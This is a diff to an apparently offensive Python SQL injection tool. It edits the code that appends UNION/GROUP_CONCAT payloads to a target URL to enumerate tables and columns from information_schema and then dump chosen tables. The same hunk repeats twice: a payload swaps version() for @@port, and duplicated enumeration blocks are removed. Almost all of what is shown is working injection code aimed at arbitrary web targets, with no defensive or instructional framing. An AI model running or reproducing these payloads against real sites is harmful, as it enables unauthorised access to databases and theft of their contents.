@@ -757,7 +757,7 @@ if target_url:
                                             print("[+] information_schema")
                                             print("")
                                         print("[INFO] Starting Enumerate DBMS table name...")
-                                        payload_4 = "(SELECT+GROUP_CONCAT(table_name,'::',column_name,'::',version()+SEPARATOR+'<br>')+FROM+information_schema.columns+WHERE+table_schema=database())"
+                                        payload_4 = "(SELECT+GROUP_CONCAT(table_name,'::',column_name,'::',@@port+SEPARATOR+'<br>')+FROM+information_schema.columns+WHERE+table_schema=database())"
                                         rm = re.sub(r"\b{}\b".format(num_countss), payload_4, payload)
                                         results_get_queries = requests.get(target_url + rm)
                                         html_cont = results_get_queries.text
@@ -773,60 +773,6 @@ if target_url:
                                             time.sleep(0.30)
                                         print(f"    Tables Name | Columns Name")
                                         print("------------------------------------")
-                                        for database in database_all:
-                                            print(f"[-] {database}")
-                                            time.sleep(0.10)
-                                        print("----------------------")
-                                        print(f"| {database_all} |")
-                                        print("-----------------------")
-                                        payload_4 = "(SELECT+GROUP_CONCAT(table_name,'::',column_name,'::',version()+SEPARATOR+'<br>')+FROM+information_schema.columns)"
-                                        rm = re.sub(r"\b{}\b".format(num_countss), payload_4, payload)
-                                        results_get_queries = requests.get(target_url + rm)
-                                        html_cont = results_get_queries.text
-                                        dbms = r"\b\w+::\b\w+::\b"
-                                        database_all = re.findall(dbms, html_cont)
-                                        print("")
-                                        print("Blind columns name")
-                                        print("Dump DBS : information_schema")
-                                        print("------------------")
-                                        print("| table | column |")
-                                        print("------------------")
-                                        for database in database_all:
-                                            print(f"[]fetching columns on table {database_table} in database : ", database)
-                                            time.sleep(0.30)
-                                        print(f"    Tables Name | Columns Name")
-                                        print("------------------------------------")
-                                        for database in database_all:
-                                            print(f"[-] {database}")
-                                            time.sleep(0.10)
-                                        print("----------------------")
-                                        print(f"| {database_all} |")
-                                        print("-----------------------")
-                                        payload_4 = "(SELECT+GROUP_CONCAT(table_name,'::',version()+SEPARATOR+'<br>')+FROM+information_schema.tables)"
-                                        rm = re.sub(r"\b{}\b".format(num_countss), payload_4, payload)
-                                        results_get_queries = requests.get(target_url + rm)
-                                        html_cont = results_get_queries.text
-                                        dbms = r"\b\w+::\b"
-                                        database_all = re.findall(dbms, html_cont)
-                                        print("")
-                                        print("Blind ALL table name")
-                                        print("Dump DBS : ALL")
-                                        print("------------------")
-                                        print("| table | column |")
-                                        print("------------------")
-                                        for database in database_all:
-                                            print(f"[INFO] fetching database on {dbs} {database}")
-                                            time.sleep(0.30)
-                                        print(f"    Tables Name | Columns Name")
-                                        print("------------------------------------")
-                                        for database in database_all:
-                                            print(f"[-] {database}")
-                                            time.sleep(0.10)
-                                        print("----------------------")
-                                        print(f"| {database_all} |")
-                                        print("-----------------------")
-                                        print("")
-                                        print("")
                                         print("You Readly Dump Database Tables ? :")
                                         text_dump = input("Name Tables : ")
                                         text_dump2 = input("Name Columns : ")
@@ -1594,7 +1540,7 @@ if target_url:
                                             print("[+] information_schema")
                                             print("")
                                         print("[INFO] Starting Enumerate DBMS table name...")
-                                        payload_4 = "(SELECT+GROUP_CONCAT(table_name,'::',column_name,'::',version()+SEPARATOR+'<br>')+FROM+information_schema.columns+WHERE+table_schema=database())"
+                                        payload_4 = "(SELECT+GROUP_CONCAT(table_name,'::',column_name,'::',@@port+SEPARATOR+'<br>')+FROM+information_schema.columns+WHERE+table_schema=database())"
                                         rm = re.sub(r"\b{}\b".format(num_countss), payload_4, payload)
                                         results_get_queries = requests.get(target_url + rm)
                                         html_cont = results_get_queries.text
@@ -1610,60 +1556,6 @@ if target_url:
                                             time.sleep(0.30)
                                         print(f"    Tables Name | Columns Name")
                                         print("------------------------------------")
-                                        for database in database_all:
-                                            print(f"[-] {database}")
-                                            time.sleep(0.10)
-                                        print("----------------------")
-                                        print(f"| {database_all} |")
-                                        print("-----------------------")
-                                        payload_4 = "(SELECT+GROUP_CONCAT(table_name,'::',column_name,'::',version()+SEPARATOR+'<br>')+FROM+information_schema.columns)"
-                                        rm = re.sub(r"\b{}\b".format(num_countss), payload_4, payload)
-                                        results_get_queries = requests.get(target_url + rm)
-                                        html_cont = results_get_queries.text
-                                        dbms = r"\b\w+::\b\w+::\b"
-                                        database_all = re.findall(dbms, html_cont)
-                                        print("")
-                                        print("Blind columns name")
-                                        print("Dump DBS : information_schema")
-                                        print("------------------")
-                                        print("| table | column |")
-                                        print("------------------")
-                                        for database in database_all:
-                                            print(f"[]fetching columns on table {database_table} in database : ", database)
-                                            time.sleep(0.30)
-                                        print(f"    Tables Name | Columns Name")
-                                        print("------------------------------------")
-                                        for database in database_all:
-                                            print(f"[-] {database}")
-                                            time.sleep(0.10)
-                                        print("----------------------")
-                                        print(f"| {database_all} |")
-                                        print("-----------------------")
-                                        payload_4 = "(SELECT+GROUP_CONCAT(table_name,'::',version()+SEPARATOR+'<br>')+FROM+information_schema.tables)"
-                                        rm = re.sub(r"\b{}\b".format(num_countss), payload_4, payload)
-                                        results_get_queries = requests.get(target_url + rm)
-                                        html_cont = results_get_queries.text
-                                        dbms = r"\b\w+::\b"
-                                        database_all = re.findall(dbms, html_cont)
-                                        print("")
-                                        print("Blind ALL table name")
-                                        print("Dump DBS : ALL")
-                                        print("------------------")
-                                        print("| table | column |")
-                                        print("------------------")
-                                        for database in database_all:
-                                            print(f"[INFO] fetching database on {dbs} {database}")
-                                            time.sleep(0.30)
-                                        print(f"    Tables Name | Columns Name")
-                                        print("------------------------------------")
-                                        for database in database_all:
-                                            print(f"[-] {database}")
-                                            time.sleep(0.10)
-                                        print("----------------------")
-                                        print(f"| {database_all} |")
-                                        print("-----------------------")
-                                        print("")
-                                        print("")
                                         print("You Readly Dump Database Tables ? :")
                                         text_dump = input("Name Tables : ")
                                         text_dump2 = input("Name Columns : ")
